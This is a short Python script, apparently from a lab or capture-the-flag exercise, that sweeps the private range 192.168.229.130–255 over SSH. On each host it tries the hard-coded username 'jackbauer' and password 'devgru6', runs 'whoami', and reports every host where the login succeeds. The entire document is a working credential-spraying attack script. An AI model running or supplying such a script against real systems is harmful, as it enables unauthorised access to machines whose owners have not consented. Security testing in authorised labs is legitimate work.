import fabric # sudo apt-get install fabric

for x in range(130, 256):
    try:
        host = f"192.168.229.{x}"
        print(f"Testing {host}")
        result = fabric.Connection(host=host, user="jackbauer", port=22, connect_kwargs={"password": "devgru6"}).run("whoami", hide=True)
        print(f"Oh shit! They didn't change their password on {host}")
    except OSError:
        pass